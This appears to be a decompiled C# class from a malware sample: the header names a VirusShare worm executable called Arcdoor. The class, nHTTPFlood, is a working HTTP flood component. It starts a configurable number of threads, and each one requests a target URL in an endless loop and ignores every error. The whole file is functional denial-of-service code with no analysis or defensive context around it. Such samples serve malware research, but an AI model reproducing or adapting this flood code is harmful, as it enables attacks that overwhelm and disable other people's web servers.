// Decompiled with JetBrains decompiler
// Type: SysDriver.nHTTPFlood
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 591752E5-2C24-490A-AF88-A636AB72D7B7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Worm.MSIL.Arcdoor.ae-9a70c0fa82dd869c7b769f53a0f2f245e58c379690ba2933aaf80f8e9c831958.exe

using System.Net;
using System.Threading;

namespace SysDriver
{
  internal class nHTTPFlood
  {
    private static ThreadStart[] tFloodingJob;
    private static Thread[] tFloodingThread;
    public static string sFHost;
    private static nHTTPFlood.HTTPRequest[] hRequestClass;
    public static int iThreads;

    public static void StartHTTPFlood()
    {
      nHTTPFlood.tFloodingThread = new Thread[nHTTPFlood.iThreads];
      nHTTPFlood.tFloodingJob = new ThreadStart[nHTTPFlood.iThreads];
      nHTTPFlood.hRequestClass = new nHTTPFlood.HTTPRequest[nHTTPFlood.iThreads];
      if (!nHTTPFlood.sFHost.StartsWith("http://"))
        nHTTPFlood.sFHost = "http://" + nHTTPFlood.sFHost;
      for (int index = 0; index < nHTTPFlood.iThreads; ++index)
      {
        nHTTPFlood.hRequestClass[index] = new nHTTPFlood.HTTPRequest(nHTTPFlood.sFHost);
        nHTTPFlood.tFloodingJob[index] = new ThreadStart(nHTTPFlood.hRequestClass[index].Send);
        nHTTPFlood.tFloodingThread[index] = new Thread(nHTTPFlood.tFloodingJob[index]);
        nHTTPFlood.tFloodingThread[index].Start();
      }
    }

    public static void StopHTTPFlood()
    {
      for (int index = 0; index < nHTTPFlood.iThreads; ++index)
      {
        try
        {
          nHTTPFlood.tFloodingThread[index].Abort();
          nHTTPFlood.tFloodingThread[index].Join();
        }
        catch
        {
        }
      }
    }

    private class HTTPRequest
    {
      private string sFHost;
      private WebClient wHTTP = new WebClient();

      public HTTPRequest(string tHost) => this.sFHost = tHost;

      public void Send()
      {
        while (true)
        {
          try
          {
            this.wHTTP.DownloadString(this.sFHost);
          }
          catch
          {
          }
        }
      }
    }
  }
}
